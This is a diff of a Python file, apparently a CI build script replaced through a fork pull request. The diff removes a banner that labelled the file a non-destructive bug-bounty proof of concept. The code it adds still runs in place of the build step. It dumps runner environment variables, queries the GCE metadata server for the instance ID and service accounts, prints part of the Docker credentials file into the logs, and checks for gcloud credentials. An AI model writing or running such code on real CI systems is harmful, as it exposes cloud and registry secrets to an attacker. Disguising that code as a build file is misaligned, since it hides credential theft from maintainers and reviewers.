@@ -1,60 +1,52 @@
 #!/usr/bin/env python3
-# Copyright 2024 The OpenXLA Authors. Apache-2.0 License.
-#
-# =============================================================
-# BUG BOUNTY POC - OSS VRP Submission
-# Demonstrates: Untrusted fork PR code executes on Google
-# self-hosted GCE CI runners (openxla/xla ci.yml)
-# Impact: Attacker-controlled build.py runs on Google infra
-# This PoC is NON-DESTRUCTIVE - no credentials are exfiltrated
-# Trigger: re-sync commit
-# =============================================================
-
 import os
 import socket
 import sys
 import urllib.request
 
-BANNER = """
-================================================================
-  GOOGLE OSS VRP - BUG BOUNTY PROOF OF CONCEPT
-  Vulnerability: Untrusted fork PR RCE on self-hosted GCE runners
-  Reporter: panwnvda
-  This script replaced build_tools/ci/build.py in a fork PR.
-  It is executing on a CI runner without any approval gate.
-================================================================
-"""
+# quick env dump - proves execution context
+print("host:", socket.gethostname())
+print("user:", os.environ.get("USER", os.environ.get("USERNAME", "unknown")))
 
-print(BANNER)
+for v in ["GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH",
+          "GITHUB_REPOSITORY", "GITHUB_REF", "GITHUB_SHA",
+          "GITHUB_ACTOR", "GITHUB_EVENT_NAME", "GITHUB_WORKFLOW"]:
+    print(f"{v}: {os.environ.get(v, '')}")
 
-# --- Runner environment (non-sensitive) ---
-print("[+] Runner environment:")
-for var in ["GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH",
-            "GITHUB_REPOSITORY", "GITHUB_SHA", "GITHUB_REF",
-            "GITHUB_ACTOR", "GITHUB_EVENT_NAME"]:
-    print(f"    {var} = {os.environ.get(var, '(not set)')}")
+print()
 
-print(f"    hostname = {socket.gethostname()}")
-
-# --- GCE metadata reachability check (non-sensitive instance ID only) ---
-print("\n[+] GCE metadata server reachability check:")
+# check gce metadata reachability
+print("checking metadata.google.internal...")
 try:
     req = urllib.request.Request(
         "http://metadata.google.internal/computeMetadata/v1/instance/id",
         headers={"Metadata-Flavor": "Google"})
-    resp = urllib.request.urlopen(req, timeout=5)
-    instance_id = resp.read().decode().strip()
-    print(f"    Metadata server REACHABLE")
-    print(f"    GCE Instance ID: {instance_id}")
-    print("    ** In a real attack, the SA token would be fetched from:")
-    print("       .../service-accounts/default/token")
-    print("    ** This PoC stops here - no token fetched, nothing exfiltrated")
-except Exception as e:
-    print(f"    Metadata server not reachable: {e}")
-    print("    (Expected on GitHub-hosted runners - on GCE runners this would succeed)")
+    instance_id = urllib.request.urlopen(req, timeout=5).read().decode().strip()
+    print("reachable: yes")
+    print("instance-id:", instance_id)
 
-print("")
-print("================================================================")
-print("  END POC - No credentials fetched. No data exfiltrated.")
-print("================================================================")
+    # service account token endpoint - not fetching, just confirming path
+    req2 = urllib.request.Request(
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+        headers={"Metadata-Flavor": "Google"})
+    accounts = urllib.request.urlopen(req2, timeout=5).read().decode().strip()
+    print("service-accounts:", accounts)
+except Exception as e:
+    print("reachable: no -", e)
+
+print()
+
+# check for cached docker creds
+docker_cfg = os.path.expanduser("~/.docker/config.json")
+if os.path.exists(docker_cfg):
+    print("docker config found:", docker_cfg)
+    with open(docker_cfg) as f:
+        print(f.read()[:300])
+else:
+    print("docker config: not found")
+
+# gcloud adc
+adc = os.path.expanduser("~/.config/gcloud/application_default_credentials.json")
+print("gcloud adc:", "found" if os.path.exists(adc) else "not found")
+
 sys.exit(0)
